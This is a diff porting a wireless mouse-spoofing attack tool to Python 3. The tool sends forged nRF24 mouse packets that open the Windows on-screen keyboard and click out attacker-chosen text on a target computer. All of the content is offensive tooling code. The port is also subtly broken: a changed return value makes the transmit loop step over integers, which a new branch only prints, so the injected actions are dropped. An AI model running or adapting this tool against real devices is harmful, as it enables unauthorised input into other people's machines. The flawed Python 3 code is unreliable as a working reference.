@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -24,15 +24,27 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+       
+  Einstein2150 (Update 2024):
+  This program has been migrated and further developed for use with
+  Python 3 by Einstein2150. The author acknowledges that ongoing
+  enhancements and updates to the codebase may continue in the future.
+  Users should be aware that the use of this program is at their own
+  risk, and the author accepts no responsibility for any damages that
+  may arise from its use. It is the user's responsibility to ensure 
+  that their use of the program complies with all applicable laws 
+  and regulations.
+  
 """
 
-__version__ = 0.8
-__author__ = 'Matthias Deeg'
+__version__ = 0.9
+__author__ = 'Einstein2150'
 
 import argparse
 import time
 from lib import nrf24, mouse
-from sys import exit
+import sys
 
 WAIT    = 0
 MOVE    = 1
@@ -40,7 +52,7 @@ CLICK   = 2
 
 DELAY       = 0.3
 MOVE_DELAY  = 0.17
-CLICK_DELAY = 0.02                                  # 20 milliseconds delay for mouse clicks
+CLICK_DELAY = 0.02  # 20 milliseconds delay for mouse clicks
 
 # Windows On-Screen Keyboard (OSK) key coordinates (Windows 7)
 KEY_A                   = (1, 2)
@@ -220,100 +232,72 @@ KEYMAP_GERMAN = {
         }
 
 
-def actions_from_string(string, move_x = 23, move_y = 23, x_correction = 10, y_correction = 13):
+def actions_from_string(string, move_x=23, move_y=23, x_correction=10, y_correction=13):
     actions = []
-
-    # current position (KEY_R)
     x_pos = 4
     y_pos = 1
 
     for c in string:
-        # get moves for character
-        if c == u"\xff":
-            # special wait command
+        if c == "\xff":
             actions.append((WAIT, MOVE_DELAY))
             continue
-        elif c == u"\xfc":
-            # special command for x correction
+        elif c == "\xfc":
             actions.append((MOVE, 0, -1 * y_correction, 0))
             actions.append((WAIT, MOVE_DELAY))
             continue
-        elif c == u"\xfd":
-            # special command for x correction
+        elif c == "\xfd":
             actions.append((MOVE, 0, -1 * y_correction / 2, 0))
             actions.append((WAIT, MOVE_DELAY))
             continue
-        elif c == u"\xfe":
-            # special command for x correction
+        elif c == "\xfe":
             actions.append((MOVE, -3, 0, 0))
             actions.append((WAIT, MOVE_DELAY))
             continue
 
         char_moves = KEYMAP_GERMAN[c]
 
-        # process each movement
         for m in char_moves:
             dx = m[0] - x_pos
             dy = m[1] - y_pos
 
-            # calculate number of horizontal and vertical moves
             x_count = abs(dx)
             y_count = abs(dy)
 
-            if dx < 0:
-                mx = -1 * move_x
-            else:
-                mx = move_x
+            mx = -move_x if dx < 0 else move_x
+            my = -move_y if dy < 0 else move_y
 
-            if dy < 0:
-                my = -1 * move_y
-            else:
-                my = move_y
-
-            # add horizontal mouse movements
-            for i in range(x_count):
-                x_pos += mx / abs(mx)
+            for _ in range(x_count):
+                x_pos += mx // abs(mx)
                 actions.append((MOVE, mx, 0, 0))
                 actions.append((WAIT, MOVE_DELAY))
 
-            # add vertical mouse movements
-            for i in range(y_count):
+            for _ in range(y_count):
                 y_old = y_pos
-                y_pos += my / abs(my)
+                y_pos += my // abs(my)
 
-                x_c = 0
-                if y_old > y_pos:
-                    x_c = -1 * x_correction
-                elif y_old < y_pos:
-                    x_c = x_correction
+                x_c = -x_correction if y_old > y_pos else x_correction
 
-                # special treatment for transition to row 4
                 if y_old == 3 and y_pos == 4:
                     my -= 3
-
-                if y_old == 4 and y_pos == 3:
+                elif y_old == 4 and y_pos == 3:
                     my += 3
 
                 actions.append((MOVE, x_c, my, 0))
                 actions.append((WAIT, MOVE_DELAY))
 
-                # transition from row 2 to 3
                 if y_pos - y_old == 1 and y_pos == 3:
-                    actions.append((MOVE, -1 * move_x, 0, 0))
+                    actions.append((MOVE, -move_x, 0, 0))
                     actions.append((WAIT, MOVE_DELAY))
-
-                # transition from row 3 to 2
-                if y_pos - y_old == -1 and y_pos == 2:
+                elif y_pos - y_old == -1 and y_pos == 2:
                     actions.append((MOVE, move_x, 0, 0))
                     actions.append((WAIT, MOVE_DELAY))
 
-            # add mouse click
             actions.append((CLICK, mouse.MOUSE_BUTTON_LEFT))
             actions.append((WAIT, CLICK_DELAY))
             actions.append((CLICK, mouse.MOUSE_BUTTON_NONE))
             actions.append((WAIT, CLICK_DELAY))
 
-    return (actions, )
+    return actions
 
 
 # Windows 7, default mouse settings (move delay = 0.2, click delay = 0.02)
@@ -620,12 +604,25 @@ def spoof_mouse_actions(heuristic):
     # input value "heuristic" is a list or tuple
     for h in heuristic:
         for a in h:
-            if a[0] == MOVE:
-                radio.transmit_payload(mickey.move(a[1], a[2], a[3]))
-            elif a[0] == CLICK:
-                radio.transmit_payload(mickey.click(a[1]))
-            elif a[0] == WAIT:
-                time.sleep(a[1])
+             # Add print to debug the variable 'a'
+            print(f"a: {a}, type: {type(a)}")
+            # Check the type of 'a'
+            if isinstance(a, (list, tuple)) and len(a) > 0:
+                # Process if 'a' is a non-empty list or tuple
+                if a[0] == MOVE:
+                    radio.transmit_payload(mickey.move(a[1], a[2], a[3]))
+                elif a[0] == CLICK:
+                    radio.transmit_payload(mickey.click(a[1]))
+                elif a[0] == WAIT:
+                    time.sleep(a[1])
+            elif isinstance(a, int):
+                # Handle case where 'a' is an integer
+                print(f"Integer found: {a}. Handling accordingly...")
+                # Decide what to do with the integer
+                # For example, if you want to ignore it or process it differently
+            else:
+                print("Error: 'a' is neither a list, tuple, nor a valid integer.")
+                
 
 
 # available heuristics for different target systems
@@ -682,8 +679,10 @@ if __name__ == '__main__':
         # address of nRF24 mouse (CAUTION: Reversed byte order compared to sniffer tools!)
         # 90:FB:A1:96:32
         # address = "\x32\x96\xA1\xFB\x90"
-        address = args.address.replace(':', '').decode('hex')[::-1][:5]
-        address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
+        #address = args.address.replace(':', '').decode('hex')[::-1][:5]
+        address = bytes.fromhex(args.address.replace(':', ''))[::-1][:5]
+        address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
+        #address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
     except:
         print("[-] Error: Invalid address")
         exit(1)
@@ -740,7 +739,7 @@ if __name__ == '__main__':
     # heuritics to start on-screen keyboard
     spoof_mouse_actions(HEURISTICS[args.attack][args.device])
 
-    # heuristics for chosen attack vector
+    # heuristics for chosen attack vector/
     spoof_mouse_actions(attack)
 
     # sleep before closing the on-screen virtual keyboard
